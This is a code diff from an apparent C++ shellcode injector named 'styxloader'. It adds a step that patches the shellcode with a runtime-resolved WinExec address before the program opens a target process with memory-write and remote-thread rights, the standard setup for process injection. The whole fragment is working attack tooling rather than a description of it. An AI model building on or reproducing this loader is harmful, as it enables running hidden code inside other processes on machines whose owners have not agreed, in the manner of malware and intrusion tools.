@@ -35,6 +35,13 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    // Patch shellcode with the runtime-resolved WinExec address (commit 6).
+    // The shellcode.asm layout reserves the first 8 bytes for this address.
+    if (!styxloader::PatchShellcodeWinExec(shellcode)) {
+        std::cout << "Error: failed to patch shellcode with WinExec address." << std::endl;
+        return 1;
+    }
+
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                   PROCESS_CREATE_THREAD, FALSE, pid);
     if (!hProcess) {
